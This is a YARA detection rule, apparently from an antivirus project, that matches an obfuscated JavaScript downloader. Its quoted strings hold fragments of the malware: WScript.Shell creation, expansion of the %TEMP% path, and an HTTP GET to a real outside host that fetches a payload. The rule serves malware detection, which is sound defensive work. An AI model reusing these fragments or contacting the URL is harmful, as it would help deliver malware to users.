rule sig_20160427_79ba05c6f85d7065da83477f96c6c168 {
  meta:
    description = "datamaliciousorder - file 20160427_79ba05c6f85d7065da83477f96c6c168.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6c4bd0c1889b73d2d4f3f5b23e9fe405a941767136762e49620612ff81132e6d"

  strings:
    $s1  = "function IefqqAzxrv() {return DfuwySlbcf[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"6nIDxeK" ascii
    $s2  = "function IefqqAzxrv() {return DfuwySlbcf[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"6nIDxeK" ascii
    $s3  = "var DfuwySlbcf = function EdeblQthgv() {return CwihnNqmgz[WrblfEdewm](\"WScript\"+\".Shell\");}(), CdnteCpgpt = 11;" fullword ascii
    $s4  = "function RqiarKquxy(DtsinMsgtq, TwlccMonqs){UqecxGkddm = UqecxGkddm * 1; return DtsinMsgtq - TwlccMonqs;};" fullword ascii
    $s5  = "var CwihnNqmgz = this[\"WScript\"];" fullword ascii
    $s6  = "if (DvsrsMsmai[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s7  = "function VeamtCcqgn(){return KlutnSjzpv + \"\";};" fullword ascii
    $s8  = "DvsrsMsmai[GprloBvzrl](\"G\" + \"ET\", \"http://ca-cargo.sk/asl9ks\", false);" fullword ascii
    $s9  = "function OyrogYznhh() {return ((OviajApcfp == true) && (OviajApcfp == CgzaiUdbgm)) ? 1 : UqecxGkddm;};" fullword ascii
    $s10 = "var VpovfLikio = new this[\"D\"+\"ate\"]();" fullword ascii
    $s11 = "function SlhiuMogcu(){return WrblfEdewm;};" fullword ascii
    $s12 = "}while (KbymdVllte);" fullword ascii
    $s13 = "var KvfgwOftob = false;" fullword ascii
    $s14 = "OviajApcfp = true; " fullword ascii
    $s15 = "CgzaiUdbgm = true; " fullword ascii
    $s16 = "return RqiarKquxy(MuvhrPkorg, NdmyyXpocu);" fullword ascii
    $s17 = "function LudyqJshnw(GmjprZikad) {var OejtiTxzdd = (1, 2, 3, 4, 5, GmjprZikad); return OejtiTxzdd;};" fullword ascii
    $s18 = "var CgzaiUdbgm = false;" fullword ascii
    $s19 = "function IrgyvTampu()" fullword ascii
    $s20 = "var OviajApcfp = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}